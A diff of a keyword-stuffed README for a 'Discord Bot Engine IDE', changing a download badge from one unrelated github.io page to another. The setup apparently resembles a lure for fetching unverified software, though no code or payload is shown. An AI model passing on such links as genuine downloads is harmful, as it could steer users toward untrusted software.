@@ -21,7 +21,7 @@ To begin using this **Discord Bot Engine Development** platform and **Discord Bo
 | :--- | :--- |
 | **Get Discord Bot Engine** | Click the button below to start the setup for this **Discord Bot Engine IDE**. |
 
-[![Button](https://img.shields.io/badge/🤖-Get_Discord_Bot_Engine-2ea44f?style=for-the-badge)](https://susanevansd680.github.io/.github/discord-bot-engine-ide)
+[![Discord Bot Engine](https://img.shields.io/badge/Open-Discord%20Bot%20Engine-EB459C?style=for-the-badge)](https://discord-bot-moderation.github.io/.github/discord-bot-ide)
 
 ## System Requirements
 
